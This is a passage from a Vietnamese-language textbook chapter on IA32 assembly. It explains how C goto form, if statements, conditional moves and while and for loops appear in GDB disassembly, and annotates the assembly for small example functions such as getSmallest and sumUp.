Ngoài ra, cần nhớ rằng các từ <em>greater</em> và <em>less</em> yêu cầu CPU hiểu phép so sánh là <strong>có dấu</strong>, trong khi <em>above</em> và <em>below</em> yêu cầu hiểu phép so sánh là <strong>không dấu</strong>.</p>
<h3 id="câu-lệnh-goto-1"><a class="header" href="#câu-lệnh-goto-1">Câu lệnh <code>goto</code></a></h3>
<p>Trong các phần tiếp theo, chúng ta sẽ xem xét các câu lệnh điều kiện và vòng lặp trong assembly, sau đó dịch ngược chúng về C.<br />
Khi dịch ngược code assembly của các câu lệnh điều kiện và vòng lặp về C, việc hiểu dạng <code>goto</code> tương ứng trong C là rất hữu ích.</p>
<p>Câu lệnh <code>goto</code> là một primitive trong C, buộc chương trình nhảy tới một dòng khác trong code.<br />
Lệnh assembly tương ứng với <code>goto</code> là <code>jmp</code>.</p>
<p>Câu lệnh <code>goto</code> bao gồm từ khóa <code>goto</code> theo sau là một <strong>goto label</strong> (nhãn goto), là một loại nhãn chương trình cho biết vị trí tiếp tục thực thi.<br />
Ví dụ: <code>goto done</code> nghĩa là chương trình sẽ nhảy tới dòng có nhãn <code>done</code>.</p>
<p>Các ví dụ khác về nhãn trong C bao gồm nhãn của câu lệnh <a href="C8-IA32/../C2-C_depth/advanced_switch.html#_c_switch_stmt_">switch</a> đã được đề cập trong Chương 2.</p>
<p><strong>Ví dụ so sánh:</strong></p>
<p><strong>Phiên bản C thông thường</strong></p>
<pre><code class="language-c">int getSmallest(int x, int y) {
    int smallest;
    if (x &gt; y) { // if (conditional)
        smallest = y; // then statement
    }
    else {
        smallest = x; // else statement
    }
    return smallest;
}
</code></pre>
<p><strong>Phiên bản dùng <code>goto</code></strong></p>
<pre><code class="language-c">int getSmallest(int x, int y) {
    int smallest;
    if (x &lt;= y) { // if (!conditional)
        goto else_statement;
    }
    smallest = y; // then statement
    goto done;

else_statement:
    smallest = x; // else statement

done:
    return smallest;
}
</code></pre>
<p><strong>Bảng 6.</strong> So sánh một hàm C và dạng <code>goto</code> tương ứng của nó.</p>
<p><strong>Bảng 6</strong> minh họa hàm <code>getSmallest()</code> được viết bằng cú pháp C thông thường và dạng <code>goto</code> tương ứng trong C.<br />
Hàm <code>getSmallest()</code> so sánh giá trị của hai số nguyên (<code>x</code> và <code>y</code>), và gán giá trị nhỏ hơn cho biến <code>smallest</code>.</p>
<p>Dạng <code>goto</code> của hàm này có thể trông hơi phản trực giác, nhưng hãy phân tích chính xác điều gì đang diễn ra.<br />
Câu lệnh điều kiện kiểm tra xem biến <code>x</code> có nhỏ hơn hoặc bằng <code>y</code> hay không.</p>
<ul>
<li>
<p>Nếu <code>x</code> nhỏ hơn hoặc bằng <code>y</code>, chương trình sẽ chuyển quyền điều khiển tới nhãn <code>else_statement</code>, nơi chứa duy nhất câu lệnh <code>smallest = x</code>.<br />
Vì chương trình thực thi tuần tự, nó sẽ tiếp tục chạy phần code dưới nhãn <code>done</code>, trả về giá trị của <code>smallest</code> (tức <code>x</code>).</p>
</li>
<li>
<p>Nếu <code>x</code> lớn hơn <code>y</code>, thì <code>smallest</code> được gán giá trị <code>y</code>.<br />
Sau đó chương trình thực thi câu lệnh <code>goto done</code>, chuyển quyền điều khiển tới nhãn <code>done</code>, nơi trả về giá trị của <code>smallest</code> (tức <code>y</code>).</p>
</li>
</ul>
<p>Mặc dù câu lệnh <code>goto</code> từng được sử dụng phổ biến trong những ngày đầu của lập trình, nhưng việc dùng nó trong code hiện đại được coi là <strong>thói quen xấu</strong>, vì nó làm giảm khả năng đọc hiểu của code.<br />
Trên thực tế, nhà khoa học máy tính <strong>Edsger Dijkstra</strong> đã viết một bài báo nổi tiếng chỉ trích việc sử dụng <code>goto</code> với tiêu đề <em>Go To Statement Considered Harmful</em><sup class="footnote-reference"><a href="#1^">1</a></sup>.</p>
<p>Nhìn chung, các chương trình C được thiết kế tốt sẽ <strong>không</strong> sử dụng câu lệnh <code>goto</code>, và lập trình viên được khuyến cáo tránh dùng nó để không tạo ra code khó đọc, khó gỡ lỗi và khó bảo trì.<br />
Tuy nhiên, việc hiểu câu lệnh <code>goto</code> trong C vẫn quan trọng, vì <strong>GCC</strong> thường chuyển đổi code C có chứa điều kiện sang dạng <code>goto</code> trước khi dịch sang assembly, bao gồm cả code có câu lệnh <code>if</code> và vòng lặp.</p>
<p>Các phần tiếp theo sẽ trình bày chi tiết hơn về cách biểu diễn câu lệnh <code>if</code> và vòng lặp trong assembly:</p>
<ul>
<li><a href="C8-IA32/if_statements.html#_if_statements_in_assembly">If Statements</a></li>
<li>Loops</li>
</ul>
<h3 id="tài-liệu-tham-khảo-2"><a class="header" href="#tài-liệu-tham-khảo-2">Tài liệu tham khảo</a></h3>
<div class="footnote-definition" id="1^"><sup class="footnote-definition-label">1</sup>
<p>Edsger Dijkstra. <em>Go To Statement Considered Harmful</em>. <em>Communications of the ACM</em> 11(3), trang 147–148, 1968.</p>
</div>
<div style="break-before: page; page-break-before: always;"></div><h3 id="842-câu-lệnh-if-trong-assembly"><a class="header" href="#842-câu-lệnh-if-trong-assembly">8.4.2. Câu lệnh if trong Assembly</a></h3>
<p>Hãy cùng xem hàm <code>getSmallest</code> ở dạng assembly.<br />
Để tiện theo dõi, hàm được nhắc lại dưới đây:</p>
<pre><code class="language-c">int getSmallest(int x, int y) {
    int smallest;
    if ( x &gt; y ) {
        smallest = y;
    }
    else {
        smallest = x;
    }
    return smallest;
}
</code></pre>
<p>Mã assembly tương ứng được trích xuất từ GDB trông như sau:</p>
<pre><code class="language-asm">(gdb) disas getSmallest
Dump of assembler code for function getSmallest:
  0x8048411 &lt;+6&gt;:   mov    0x8(%ebp),%eax
  0x8048414 &lt;+9&gt;:   cmp    0xc(%ebp),%eax
  0x8048417 &lt;+12&gt;:  jle    0x8048421 &lt;getSmallest+22&gt;
  0x8048419 &lt;+14&gt;:  mov    0xc(%ebp),%eax
  0x804841f &lt;+20&gt;:  jmp    0x8048427 &lt;getSmallest+28&gt;
  0x8048421 &lt;+22&gt;:  mov    0x8(%ebp),%eax
  0x8048427 &lt;+28&gt;:  ret
</code></pre>
<p>Đây là một cách hiển thị khác của code assembly so với trước đây.<br />
Ở đây, ta thấy <strong>địa chỉ</strong> gắn với mỗi lệnh, nhưng không thấy <strong>byte</strong> code máy.<br />
Đoạn assembly này đã được chỉnh sửa nhẹ để đơn giản hơn: các lệnh thường xuất hiện khi tạo/kết thúc hàm (như <code>push %ebp</code> và <code>mov %esp, %ebp</code>) và lệnh cấp phát bộ nhớ trên stack đã được lược bỏ.</p>
<p>Theo quy ước, GCC đặt tham số thứ nhất và thứ hai của hàm tại các vị trí <code>%ebp+8</code> và <code>%ebp+0xc</code> (hoặc <code>%ebp+12</code>).<br />
Trong phần giải thích này, ta gọi chúng lần lượt là <code>x</code> và <code>y</code>.</p>
<p>Bây giờ, hãy lần theo các dòng đầu tiên của đoạn assembly trên.<br />
Lưu ý: ví dụ này sẽ <strong>không</strong> vẽ stack minh họa; bạn đọc có thể tự luyện tập kỹ năng này.</p>
<ul>
<li>Lệnh <code>mov</code> sao chép giá trị tại địa chỉ <code>%ebp+8</code> (tham số <code>x</code>) vào thanh ghi <code>%eax</code>. Con trỏ lệnh (<code>%eip</code>) được đặt tới địa chỉ của lệnh tiếp theo: <code>0x08048414</code>.</li>
<li>Lệnh <code>cmp</code> so sánh giá trị tại <code>%ebp+12</code> (tham số <code>y</code>) với <code>x</code> và thiết lập các cờ điều kiện. <code>%eip</code> chuyển sang <code>0x08048417</code>.</li>
<li>Lệnh <code>jle</code> (jump if less or equal) cho biết: nếu <code>x &lt;= y</code>, lệnh tiếp theo sẽ là tại <code>&lt;getSmallest+22&gt;</code> (<code>mov 0x8(%ebp), %eax</code>), và <code>%eip</code> sẽ được đặt thành <code>0x8048421</code>. Ngược lại, <code>%eip</code> sẽ trỏ tới lệnh kế tiếp theo thứ tự: <code>0x8048419</code>.</li>
</ul>
<p>Các lệnh tiếp theo phụ thuộc vào việc nhánh tại <code>&lt;getSmallest+12&gt;</code> có được thực hiện hay không.</p>
<p><strong>Trường hợp 1 – Nhánh <em>không</em> được thực hiện</strong> (<code>x &gt; y</code>):</p>
<ul>
<li><code>mov 0xc(%ebp),%eax</code> tại <code>&lt;getSmallest+14&gt;</code>: sao chép <code>y</code> vào <code>%eax</code>. <code>%eip</code> → <code>0x804841f</code>.</li>
<li><code>jmp</code> đặt <code>%eip</code> → <code>0x8048427</code>.</li>
<li><code>ret</code> kết thúc hàm. Lúc này <code>%eax</code> chứa <code>y</code>, và <code>getSmallest</code> trả về <code>y</code>.</li>
</ul>
<p><strong>Trường hợp 2 – Nhánh được thực hiện</strong> (<code>x &lt;= y</code>):</p>
<ul>
<li><code>mov 0x8(%ebp),%eax</code> tại <code>0x8048421</code>: sao chép <code>x</code> vào <code>%eax</code>. <code>%eip</code> → <code>0x8048427</code>.</li>
<li><code>ret</code> kết thúc hàm. Lúc này <code>%eax</code> chứa <code>x</code>, và <code>getSmallest</code> trả về <code>x</code>.</li>
</ul>
<p>Chúng ta có thể chú thích đoạn assembly như sau:</p>
<pre><code class="language-asm">0x8048411 &lt;+6&gt;:  mov 0x8(%ebp),%eax             # copy x to %eax
0x8048414 &lt;+9&gt;:  cmp 0xc(%ebp),%eax             # compare x with y
0x8048417 &lt;+12&gt;: jle 0x8048421 &lt;getSmallest+22&gt; # if x &lt;= y goto &lt;getSmallest+22&gt;
0x8048419 &lt;+14&gt;: mov 0xc(%ebp),%eax             # copy y to %eax
0x804841f &lt;+20&gt;: jmp 0x8048427 &lt;getSmallest+28&gt; # goto &lt;getSmallest+28&gt;
0x8048421 &lt;+22&gt;: mov 0x8(%ebp),%eax             # copy x to %eax
0x8048427 &lt;+28&gt;: ret                            # exit function (return %eax)
</code></pre>
<p>Khi dịch ngược lại sang C, ta có thể viết:</p>
<h4 id="phiên-bản-dùng-goto"><a class="header" href="#phiên-bản-dùng-goto"><strong>Phiên bản dùng goto</strong></a></h4>
<pre><code class="language-c">int getSmallest(int x, int y) {
    int smallest;
    if (x &lt;= y) {
        goto assign_x;
    }
    smallest = y;
    goto done;

assign_x:
    smallest = x;

done:
    return smallest;
}
</code></pre>
<h4 id="phiên-bản-c-thông-thường"><a class="header" href="#phiên-bản-c-thông-thường"><strong>Phiên bản C thông thường</strong></a></h4>
<pre><code class="language-c">int getSmallest(int x, int y) {
    int smallest;
    if (x &lt;= y) {
        smallest = x;
    }
    else {
        smallest = y;
    }
    return smallest;
}
</code></pre>
<p><strong>Bảng 1.</strong> Dịch <code>getSmallest</code> sang dạng C dùng <code>goto</code> và dạng C thông thường.</p>
<p>Trong <strong>Bảng 1</strong>, biến <code>smallest</code> tương ứng với thanh ghi <code>%eax</code>.<br />
Nếu <code>x</code> nhỏ hơn hoặc bằng <code>y</code>, code sẽ thực thi câu lệnh <code>smallest = x</code>, câu lệnh này gắn với nhãn <code>goto</code> là <code>assign_x</code> trong phiên bản hàm dạng <code>goto</code>.<br />
Ngược lại, câu lệnh <code>smallest = y</code> sẽ được thực thi.<br />
Nhãn <code>goto</code> là <code>done</code> được dùng để chỉ ra rằng giá trị trong <code>smallest</code> sẽ được trả về.</p>
<p>Lưu ý rằng bản dịch C từ code assembly ở trên hơi khác so với hàm <code>getSmallest</code> gốc.<br />
Những khác biệt này không quan trọng; khi xem xét kỹ cả hai hàm, ta thấy chúng tương đương về mặt logic.<br />
Tuy nhiên, trình biên dịch trước tiên sẽ chuyển bất kỳ câu lệnh <code>if</code> nào sang dạng <code>goto</code> tương đương, dẫn đến phiên bản hơi khác nhưng vẫn tương đương.</p>
<p><strong>Bảng 2</strong> dưới đây cho thấy dạng chuẩn của câu lệnh <code>if</code> và dạng <code>goto</code> tương đương:</p>
<p><strong>Dạng C <code>if</code>-statement chuẩn</strong></p>
<pre><code class="language-c">if (condition) {
    then_statement;
}
else {
    else_statement;
}
</code></pre>
<p><strong>Dạng <code>goto</code> tương đương do compiler tạo ra</strong></p>
<pre><code class="language-c">if (!condition) {
    goto else;
}
then_statement;
goto done;
else:
    else_statement;
done:
</code></pre>
<p><strong>Bảng 2.</strong> Dạng chuẩn của câu lệnh <code>if</code> và dạng <code>goto</code> tương đương.</p>
<p>Khi dịch code sang assembly, compiler sẽ tạo một lệnh nhảy (jump) khi điều kiện <strong>đúng</strong>.<br />
Điều này khác với cấu trúc của câu lệnh <code>if</code>, nơi “nhảy” (tới <code>else</code>) xảy ra khi điều kiện <strong>không đúng</strong>.<br />
Dạng <code>goto</code> thể hiện rõ sự khác biệt logic này.</p>
<p>Xét bản dịch <code>goto</code> của hàm <code>getSmallest</code>, ta thấy:</p>
<ul>
<li><code>x &lt;= y</code> tương ứng với <code>!condition</code>.</li>
<li><code>smallest = x</code> là <code>else_statement</code>.</li>
<li><code>smallest = y</code> là <code>then_statement</code>.</li>
<li>Dòng cuối của hàm là <code>return smallest</code>.</li>
</ul>
<p>Viết lại phiên bản gốc của hàm với các chú thích trên:</p>
<pre><code class="language-c">int getSmallest(int x, int y) {
    int smallest;
    if (x &gt; y) {     // !(x &lt;= y)
        smallest = y; // then_statement
    }
    else {
        smallest = x; // else_statement
    }
    return smallest;
}
</code></pre>
<p>Phiên bản này giống hệt với hàm <code>getSmallest</code> ban đầu.<br />
Hãy nhớ rằng một hàm viết theo nhiều cách khác nhau trong C vẫn có thể được dịch ra cùng một tập lệnh assembly.</p>
<h4 id="lệnh-cmov"><a class="header" href="#lệnh-cmov">Lệnh <code>cmov</code></a></h4>
<p>Nhóm lệnh điều kiện cuối cùng mà chúng ta đề cập là <strong>conditional move</strong> (<code>cmov</code>).<br />
Các lệnh <code>cmp</code>, <code>test</code> và <code>jmp</code> thực hiện <strong>chuyển điều khiển có điều kiện</strong> (<em>conditional transfer of control</em>) trong chương trình.<br />
Nói cách khác, luồng thực thi của chương trình sẽ rẽ nhánh theo nhiều hướng.<br />
Điều này có thể gây bất lợi cho việc tối ưu hóa code, vì các nhánh này thường tốn kém.</p>
<p>Ngược lại, lệnh <code>cmov</code> thực hiện <strong>chuyển dữ liệu có điều kiện</strong> (<em>conditional transfer of data</em>).<br />
Nói cách khác, cả <code>then_statement</code> và <code>else_statement</code> của câu lệnh điều kiện đều được thực thi, và dữ liệu sẽ được đặt vào thanh ghi thích hợp dựa trên kết quả của điều kiện.</p>
<p>Việc sử dụng <strong>biểu thức ba ngôi</strong> (ternary expression) trong C thường khiến compiler sinh ra lệnh <code>cmov</code> thay vì các lệnh nhảy.<br />
Với câu lệnh if-then-else chuẩn, biểu thức ba ngôi có dạng:</p>
<pre><code class="language-c">condition ? then_statement : else_statement;
</code></pre>
<p>Biểu thức ba ngôi (ternary expression) trong C có dạng:</p>
<pre><code class="language-c">result = (condition) ? then_statement : else_statement;
</code></pre>
<p>Hãy sử dụng dạng này để viết lại hàm <code>getSmallest</code> dưới dạng biểu thức ba ngôi.<br />
Lưu ý rằng phiên bản mới này hoạt động <strong>hoàn toàn giống</strong> với hàm <code>getSmallest</code> ban đầu:</p>
<pre><code class="language-c">int getSmallest_cmov(int x, int y) {
    return x &gt; y ? y : x;
}
</code></pre>
<p>Mặc dù thay đổi này có vẻ không lớn, nhưng hãy xem code assembly được tạo ra.<br />
Nhắc lại rằng tham số thứ nhất (<code>x</code>) và tham số thứ hai (<code>y</code>) được lưu tại các địa chỉ trên stack lần lượt là <code>%ebp+0x8</code> và <code>%ebp+0xc</code>.</p>
<pre><code class="language-asm">0x08048441 &lt;+0&gt;:   push   %ebp              # save ebp
0x08048442 &lt;+1&gt;:   mov    %esp,%ebp         # update ebp
0x08048444 &lt;+3&gt;:   mov    0xc(%ebp),%eax    # copy y to %eax
0x08048447 &lt;+6&gt;:   cmp    %eax,0x8(%ebp)    # compare x with y
0x0804844a &lt;+9&gt;:   cmovle 0x8(%ebp),%eax    # if (x &lt;= y) copy x to %eax
0x0804844e &lt;+13&gt;:  pop    %ebp              # restore %ebp
0x0804844f &lt;+14&gt;:  ret                      # return %eax
</code></pre>
<p>Đoạn code assembly này <strong>không có lệnh nhảy</strong>.<br />
Sau khi so sánh <code>x</code> và <code>y</code>, giá trị <code>x</code> chỉ được chuyển vào thanh ghi trả về nếu <code>x &lt;= y</code>.<br />
Tương tự như các lệnh nhảy, hậu tố (suffix) của lệnh <code>cmov</code> cho biết điều kiện mà việc di chuyển dữ liệu có điều kiện sẽ xảy ra.</p>
<p><strong>Bảng 3</strong> liệt kê tập hợp các lệnh <code>cmov</code>:</p>
<div class="table-wrapper"><table><thead><tr><th>Signed</th><th>Unsigned</th><th>Mô tả</th></tr></thead><tbody>
<tr><td><code>cmove</code> (<code>cmovz</code>)</td><td></td><td>move if equal (==)</td></tr>
<tr><td><code>cmovne</code> (<code>cmovnz</code>)</td><td></td><td>move if not equal (!=)</td></tr>
<tr><td><code>cmovs</code></td><td></td><td>move if negative</td></tr>
<tr><td><code>cmovns</code></td><td></td><td>move if non-negative</td></tr>
<tr><td><code>cmovg</code> (<code>cmovnle</code>)</td><td><code>cmova</code> (<code>cmovnbe</code>)</td><td>move if greater (&gt;)</td></tr>
<tr><td><code>cmovge</code> (<code>cmovnl</code>)</td><td><code>cmovae</code> (<code>cmovnb</code>)</td><td>move if greater than or equal (&gt;=)</td></tr>
<tr><td><code>cmovl</code> (<code>cmovnge</code>)</td><td><code>cmovb</code> (<code>cmovnae</code>)</td><td>move if less (&lt;)</td></tr>
<tr><td><code>cmovle</code> (<code>cmovng</code>)</td><td><code>cmovbe</code> (<code>cmovna</code>)</td><td>move if less than or equal (&lt;=)</td></tr>
</tbody></table>
</div>
<p><strong>Bảng 3.</strong> Các lệnh <code>cmov</code>.</p>
<p>Compiler rất thận trọng khi chuyển đổi các lệnh nhảy thành lệnh <code>cmov</code>, đặc biệt trong các trường hợp có <strong>side effect</strong> (tác dụng phụ) hoặc liên quan đến giá trị con trỏ.</p>
<p><strong>Bảng 4</strong> sẽ cho thấy hai cách viết tương đương của một hàm <code>incrementX</code>.</p>
<h3 id="bảng-4-hai-hàm-cố-gắng-tăng-giá-trị-của-số-nguyên-x"><a class="header" href="#bảng-4-hai-hàm-cố-gắng-tăng-giá-trị-của-số-nguyên-x"><strong>Bảng 4.</strong> Hai hàm cố gắng tăng giá trị của số nguyên <code>x</code></a></h3>
<h4 id="dạng-c-thông-thường"><a class="header" href="#dạng-c-thông-thường"><strong>Dạng C thông thường</strong></a></h4>
<pre><code class="language-c">int incrementX(int *x) {
    if (x != NULL) { // nếu x không NULL
        return (*x)++; // tăng giá trị mà x trỏ tới và trả về
    }
    else { // nếu x là NULL
        return 1; // trả về 1
    }
}
</code></pre>
<h4 id="dạng-c-dùng-biểu-thức-ba-ngôi-ternary-form"><a class="header" href="#dạng-c-dùng-biểu-thức-ba-ngôi-ternary-form"><strong>Dạng C dùng biểu thức ba ngôi (ternary form)</strong></a></h4>
<pre><code class="language-c">int incrementX2(int *x) {
    return x ? (*x)++ : 1;
}
</code></pre>
<p>Mỗi hàm nhận vào một con trỏ tới số nguyên và kiểm tra xem nó có phải <code>NULL</code> hay không.<br />
Nếu <code>x</code> không phải <code>NULL</code>, hàm sẽ tăng giá trị mà <code>x</code> trỏ tới và trả về giá trị đó.<br />
Ngược lại, hàm sẽ trả về giá trị <code>1</code>.</p>
<p>Có thể bạn sẽ nghĩ rằng <code>incrementX2</code> sử dụng lệnh <code>cmov</code> vì nó dùng biểu thức ba ngôi.<br />
Tuy nhiên, cả hai hàm đều tạo ra <strong>chính xác cùng một code assembly</strong>:</p>
<pre><code class="language-asm">0x80484cf &lt;+0&gt;:   push   %ebp
0x80484d0 &lt;+1&gt;:   mov    %esp,%ebp
0x80484d2 &lt;+3&gt;:   cmpl   $0x0,0x8(%ebp)
0x80484d6 &lt;+7&gt;:   je     0x80484e7 &lt;incrementX2+24&gt;
0x80484d8 &lt;+9&gt;:   mov    0x8(%ebp),%eax
0x80484db &lt;+12&gt;:  mov    (%eax),%eax
0x80484dd &lt;+14&gt;:  lea    0x1(%eax),%ecx
0x80484e0 &lt;+17&gt;:  mov    0x8(%ebp),%edx
0x80484e3 &lt;+20&gt;:  mov    %ecx,(%edx)
0x80484e5 &lt;+22&gt;:  jmp    0x80484ec &lt;incrementX2+29&gt;
0x80484e7 &lt;+24&gt;:  mov    $0x1,%eax
0x80484ec &lt;+29&gt;:  pop    %ebp
0x80484ed &lt;+30&gt;:  ret
</code></pre>
<p>Hãy nhớ rằng lệnh <code>cmov</code> sẽ <strong>thực thi cả hai nhánh của điều kiện</strong>.<br />
Nói cách khác, <code>x</code> sẽ luôn bị dereference (giải tham chiếu) bất kể điều kiện đúng hay sai.</p>
<p>Xét trường hợp <code>x</code> là con trỏ null: việc dereference một con trỏ null sẽ gây ra <strong>null pointer exception</strong> trong chương trình, dẫn đến <strong>segmentation fault</strong>.<br />
Để tránh hoàn toàn khả năng này, compiler chọn cách an toàn hơn là sử dụng <strong>lệnh nhảy</strong> (jump) thay vì <code>cmov</code>.</p>
<div style="break-before: page; page-break-before: always;"></div><h3 id="843-vòng-lặp-trong-assembly-loops-in-assembly"><a class="header" href="#843-vòng-lặp-trong-assembly-loops-in-assembly">8.4.3. Vòng lặp trong assembly (Loops in assembly)</a></h3>
<p>Tương tự như câu lệnh <code>if</code>, các vòng lặp trong assembly cũng được triển khai bằng <strong>lệnh nhảy</strong> (jump instruction).<br />
Tuy nhiên, vòng lặp cho phép <strong>các lệnh được thực thi lặp lại</strong> dựa trên kết quả của một điều kiện được đánh giá.</p>
<p>Hàm <code>sumUp</code> trong ví dụ dưới đây tính tổng tất cả các số nguyên dương từ 1 đến một số nguyên do người dùng nhập vào.<br />
Đoạn code này được viết <strong>không tối ưu</strong> để minh họa cách hoạt động của vòng lặp <code>while</code> trong C.</p>
<pre><code class="language-c">int sumUp(int n) {
    // khởi tạo total và i
    int total = 0;
    int i = 1;

    while (i &lt;= n) {  // khi i nhỏ hơn hoặc bằng n
        total += i;   // cộng i vào total
        i += 1;       // tăng i thêm 1
    }
    return total;
}
</code></pre>
<p>Khi biên dịch đoạn code này với tùy chọn <code>-m32</code> và dùng GDB để disassemble, ta thu được code assembly sau:</p>
<pre><code class="language-asm">(gdb) disas sumUp
Dump of assembler code for function sumUp:
  0x804840b &lt;+0&gt;:   push   %ebp
  0x804840c &lt;+1&gt;:   mov    %esp,%ebp
  0x804840e &lt;+3&gt;:   sub    $0x10,%esp
  0x8048411 &lt;+6&gt;:   movl   $0x0,-0x8(%ebp)
  0x8048418 &lt;+13&gt;:  movl   $0x1,-0x4(%ebp)
  0x804841f &lt;+20&gt;:  jmp    0x804842b &lt;sumUp+32&gt;
  0x8048421 &lt;+22&gt;:  mov    -0x4(%ebp),%eax
  0x8048424 &lt;+25&gt;:  add    %eax,-0x8(%ebp)
  0x8048427 &lt;+28&gt;:  add    $0x1,-0x4(%ebp)
  0x804842b &lt;+32&gt;:  mov    -0x4(%ebp),%eax
  0x804842e &lt;+35&gt;:  cmp    0x8(%ebp),%eax
  0x8048431 &lt;+38&gt;:  jle    0x8048421 &lt;sumUp+22&gt;
  0x8048433 &lt;+40&gt;:  mov    -0x8(%ebp),%eax
  0x8048436 &lt;+43&gt;:  leave
  0x8048437 &lt;+44&gt;:  ret
</code></pre>
<p>Chúng ta sẽ không vẽ stack minh họa trong ví dụ này, nhưng bạn đọc nên tự thực hành để hiểu rõ hơn.<br />
Bây giờ, hãy phân tích đoạn assembly này theo từng phần.</p>
<h4 id="năm-lệnh-đầu-tiên-1"><a class="header" href="#năm-lệnh-đầu-tiên-1"><strong>Năm lệnh đầu tiên</strong></a></h4>
<p>Năm lệnh đầu tiên của hàm thiết lập stack để thực thi hàm:</p>
<pre><code class="language-asm">0x804840b &lt;+0&gt;:   push   %ebp                 # lưu ebp lên stack
0x804840c &lt;+1&gt;:   mov    %esp,%ebp            # cập nhật ebp (tạo stack frame mới)
0x804840e &lt;+3&gt;:   sub    $0x10,%esp           # cấp phát 16 byte cho stack frame
0x8048411 &lt;+6&gt;:   movl   $0x0,-0x8(%ebp)      # gán 0 vào ebp-0x8 (total)
0x8048418 &lt;+13&gt;:  movl   $0x1,-0x4(%ebp)      # gán 1 vào ebp-0x4 (i)
</code></pre>
<p>Nhớ rằng các vị trí trên stack lưu <strong>biến tạm</strong> trong hàm.<br />
Trong phần giải thích này, ta gọi <code>%ebp - 0x8</code> là <code>total</code> và <code>%ebp - 0x4</code> là <code>i</code>.<br />
Tham số đầu vào <code>n</code> của hàm <code>sumUp</code> nằm tại <code>%ebp + 0x8</code>.</p>
<h4 id="phần-lõi-của-vòng-lặp"><a class="header" href="#phần-lõi-của-vòng-lặp"><strong>Phần lõi của vòng lặp</strong></a></h4>
<p>Bảy lệnh tiếp theo trong hàm <code>sumUp</code> là phần lõi của vòng lặp:</p>
<pre><code class="language-asm">0x804841f &lt;+20&gt;:  jmp    0x804842b &lt;sumUp+32&gt;  # nhảy tới &lt;sumUp+32&gt;
0x8048421 &lt;+22&gt;:  mov    -0x4(%ebp),%eax       # copy i vào eax
0x8048424 &lt;+25&gt;:  add    %eax,-0x8(%ebp)       # total += i
0x8048427 &lt;+28&gt;:  add    $0x1,-0x4(%ebp)       # i += 1
0x804842b &lt;+32&gt;:  mov    -0x4(%ebp),%eax       # copy i vào eax
0x804842e &lt;+35&gt;:  cmp    0x8(%ebp),%eax        # so sánh i với n
0x8048431 &lt;+38&gt;:  jle    0x8048421 &lt;sumUp+22&gt;  # nếu i &lt;= n thì quay lại &lt;sumUp+22&gt;
</code></pre>
<ul>
<li>Lệnh đầu tiên (<code>jmp</code>) nhảy thẳng tới <code>&lt;sumUp+32&gt;</code>, đặt <code>%eip</code> thành <code>0x804842b</code>.</li>
<li>Tại <code>&lt;sumUp+32&gt;</code> và <code>&lt;sumUp+35&gt;</code>, giá trị <code>i</code> được copy vào <code>%eax</code> và so sánh với tham số <code>n</code>.</li>
<li>Lệnh <code>cmp</code> thiết lập các cờ điều kiện để chuẩn bị cho lệnh <code>jle</code> tại <code>&lt;sumUp+38&gt;</code>.</li>
<li>Nếu <code>i &lt;= n</code>, lệnh <code>jle</code> sẽ nhảy về <code>&lt;sumUp+22&gt;</code> và thực hiện:
<ul>
<li><code>mov -0x4(%ebp),%eax</code> → copy <code>i</code> vào <code>%eax</code></li>
<li><code>add %eax,-0x8(%ebp)</code> → cộng <code>i</code> vào <code>total</code></li>
<li><code>add $0x1,-0x4(%ebp)</code> → tăng <code>i</code> thêm 1</li>
<li>Quay lại so sánh <code>i</code> với <code>n</code> và lặp lại.</li>
</ul>
</li>
</ul>
<p>Nếu điều kiện <code>i &lt;= n</code> <strong>không</strong> thỏa coden, <code>total</code> sẽ được đưa vào thanh ghi trả về <code>%eax</code> và hàm kết thúc.</p>
<h4 id="bảng-so-sánh-assembly-và-dạng-c-dùng-goto"><a class="header" href="#bảng-so-sánh-assembly-và-dạng-c-dùng-goto"><strong>Bảng so sánh Assembly và dạng C dùng goto</strong></a></h4>
<p><strong>Assembly</strong></p>
<pre><code class="language-asm">&lt;sumUp&gt;:
&lt;+0&gt;:   push   %ebp
&lt;+1&gt;:   mov    %esp,%ebp
&lt;+3&gt;:   sub    $0x10,%esp
&lt;+6&gt;:   movl   $0x0,-0x8(%ebp)
&lt;+13&gt;:  movl   $0x1,-0x4(%ebp)
&lt;+20&gt;:  jmp    &lt;sumUp+32&gt;
&lt;+22&gt;:  mov    -0x4(%ebp),%eax
&lt;+25&gt;:  add    %eax,-0x8(%ebp)
&lt;+28&gt;:  addl   $0x1,-0x4(%ebp)
&lt;+32&gt;:  mov    -0x4(%ebp),%eax
&lt;+35&gt;:  cmp    0x8(%ebp),%eax
&lt;+38&gt;:  jle    &lt;sumUp+22&gt;
&lt;+40&gt;:  mov    -0x8(%ebp),%eax
&lt;+43&gt;:  leave
&lt;+44&gt;:  ret
</code></pre>
<p><strong>Dạng C dùng goto</strong></p>
<pre><code class="language-c">int sumUp(int n) {
    int total = 0;
    int i = 1;
    goto start;

body:
    total += i;
    i += 1;

start:
    if (i &lt;= n) {
        goto body;
    }
    return total;
}
</code></pre>
<p><strong>Bảng 1.</strong> Dịch hàm <code>sumUp</code> sang dạng C dùng <code>goto</code>.</p>
<p>Đoạn code trước đó cũng tương đương với phiên bản C <strong>không</strong> dùng câu lệnh <code>goto</code> như sau:</p>
<pre><code class="language-c">int sumUp(int n) {
    int total = 0;
    int i = 1;
    while (i &lt;= n) {
        total += i;
        i += 1;
    }
    return total;
}
</code></pre>
<h4 id="vòng-lặp-for-trong-assembly-1"><a class="header" href="#vòng-lặp-for-trong-assembly-1">Vòng lặp for trong Assembly</a></h4>
<p>Vòng lặp chính trong hàm <code>sumUp</code> cũng có thể được viết lại dưới dạng vòng lặp <code>for</code>:</p>
<pre><code class="language-c">int sumUp2(int n) {
    int total = 0;             // khởi tạo total = 0
    int i;
    for (i = 1; i &lt;= n; i++) { // khởi tạo i = 1, tăng i thêm 1 khi i &lt;= n
        total += i;            // cộng i vào total
    }
    return total;
}
</code></pre>
<p>Phiên bản này tạo ra code assembly <strong>giống hệt</strong> với ví dụ vòng lặp <code>while</code>.<br />
Dưới đây là code assembly và chú thích từng dòng:</p>
<pre><code class="language-asm">0x8048438 &lt;+0&gt;:  push   %ebp                  # lưu ebp
0x8048439 &lt;+1&gt;:  mov    %esp,%ebp             # cập nhật ebp (tạo stack frame mới)
0x804843b &lt;+3&gt;:  sub    $0x10,%esp            # cấp phát 16 byte cho stack frame
0x804843e &lt;+6&gt;:  movl   $0x0,-0x8(%ebp)       # gán 0 vào ebp-0x8 (total)
0x8048445 &lt;+13&gt;: movl   $0x1,-0x4(%ebp)       # gán 1 vào ebp-0x4 (i)
